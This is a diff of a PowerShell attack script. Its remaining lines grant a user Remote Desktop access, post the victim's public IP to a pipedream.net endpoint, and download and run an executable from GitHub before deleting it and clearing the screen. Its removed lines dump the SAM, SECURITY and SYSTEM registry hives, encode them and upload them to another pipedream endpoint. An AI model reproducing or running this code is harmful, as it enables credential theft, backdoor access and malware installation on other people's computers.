@@ -7,17 +7,6 @@ net localgroup "Remote Desktop Users" /add
 net localgroup "Remote Desktop Users" blanka /add
 $PublicIP = Invoke-RestMethod -Uri 'https://api.ipify.org?format=text'
 Invoke-RestMethod -Uri 'https://16b0dcac26d763dafecd45d9e1ff9575.m.pipedream.net' -Method Post -ContentType 'application/json' -Body @{PublicIP=$PublicIP}
-try { reg save HKLM\\SAM SA.B } catch { Write-Output "Error saving SAM registry hive: $_" }
-try { certutil -encode -f SA.B SA.B } catch { Write-Output "Error encoding SA.B file: $_" }
-try { reg save HKLM\\security SE.B } catch { Write-Output "Error saving Security registry hive: $_" }
-try { certutil -encode -f SE.B SE.B } catch { Write-Output "Error encoding SE.B file: $_" }
-try { reg save HKLM\\system SY.B } catch { Write-Output "Error saving System registry hive: $_" }
-try { certutil -encode -f SY.B SY.B } catch { Write-Output "Error encoding SY.B file: $_" }
-$U='https://446018f4f559f4b0e7eddf7cd5a3b27a.m.pipedream.net'
-try { Invoke-WebRequest -Uri $U -Method POST -Infile SA.B } catch { Write-Output "Error uploading SA.B file: $_" }
-try { Invoke-WebRequest -Uri $U -Method POST -Infile SE.B } catch { Write-Output "Error uploading SE.B file: $_" }
-try { Invoke-WebRequest -Uri $U -Method POST -Infile SY.B } catch { Write-Output "Error uploading SY.B file: $_" }
-try { del *.B } catch { Write-Output "Error deleting temporary files: $_" }
 Invoke-WebRequest -Uri 'github.com/Adhrit121/Data_storage/raw/main/beta.exe' -OutFile 'beta.exe'
 Start-Process -FilePath 'beta.exe'; Start-Sleep -Seconds 2; while(Get-Process -Name 'beta' -ErrorAction SilentlyContinue){Start-Sleep -Seconds 1}; Remove-Item 'beta.exe' -Force; clear;
 
